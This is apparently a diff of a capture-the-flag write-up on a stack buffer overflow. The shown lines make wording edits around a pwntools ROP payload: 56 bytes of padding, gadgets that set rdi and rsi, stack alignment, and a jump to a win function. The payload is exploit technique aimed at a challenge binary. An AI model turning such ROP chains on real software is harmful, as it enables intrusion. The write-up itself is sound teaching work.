@@ -29,7 +29,8 @@ We can calculate at what offset precisely it gets overwrote
 
 It mean that the return address gets overwritten exactly after 56 bytes. When you send 57 bytes the return address gets overwritten.  
 
-Now we need to retrieve from the binary instructions(gadgets) and chain them together just after our 56 bytes so after the main functions ends it runs our chains on instructions. We can retrieve them with some of the useful functions and objects of `pwntools` python package.  
+Now we need to retrieve from the binary instructions(gadgets) and chain them together just after our 56 bytes so after the main functions ends it runs our chains of instructions.   
+We can retrieve them with some of the useful functions and objects of `pwntools` python package.  
 
 Here is the final script:
 
@@ -61,9 +62,9 @@ WIN = elf.sym.win # win address
 
 payload = b'A' * 56
 payload += p64(pop_rdi)    # put the next value on the stack into the rdi register
-payload += p64(0xdeadbeef) # value into the rdi register
+payload += p64(0xdeadbeef) # value to put into the rdi register
 payload += p64(pop_rsi)    # put the next value on the stack into the rsi register
-payload += p64(0xcafebabe) # value into the rsi register
+payload += p64(0xcafebabe) # value to put into the the rsi register
 payload += p64(ret)        # align the stack to 16 bytes
 payload += p64(WIN)        # call win
 
